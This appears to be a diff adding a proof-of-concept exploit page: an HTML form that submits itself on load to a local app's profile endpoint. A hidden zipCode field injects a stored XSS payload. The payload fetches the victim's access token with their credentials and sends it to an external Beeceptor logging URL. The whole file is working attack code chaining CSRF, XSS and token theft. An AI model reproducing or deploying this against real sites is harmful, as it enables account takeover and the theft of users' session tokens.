@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head><title>Exploit</title></head>
+<body>
+  <script>
+    console.log('[+] Exploit page loaded');
+    // Auto-submit the form
+    window.onload = function() {
+      document.getElementById('csrf').submit();
+    };
+  </script>
+
+  <form id="csrf" action="https://127.0.0.1:5000/api/profile" method="POST">
+    <input type="hidden" name="name" value="admin">
+    <input type="hidden" name="phone" value="123">
+    <input type="hidden" name="zipCode" value='"><script>
+      console.log("[+] XSS payload executed");
+      fetch("https://127.0.0.1:5000/setToken", { credentials: "include" })
+        .then(r => {
+          console.log("[+] setToken status:", r.status);
+          return r.json();
+        })
+        .then(d => {
+          console.log("[+] Token response:", d);
+          if (d.access_token) {
+            console.log("[+] Exfiltrating token");
+            // Replace with your exfil endpoint (e.g., your Beeceptor or local listener)
+            fetch("https://anas0x1.free.beeceptor.com/log?token=" + encodeURIComponent(d.access_token));
+          } else {
+            console.error("[-] No access_token:", d);
+          }
+        })
+        .catch(e => console.error("[-] Fetch error:", e));
+    </script>'>
+    <input type="submit">
+  </form>
+
+  <script>
+    console.log('[+] Form submitted');
+  </script>
+</body>
+</html>
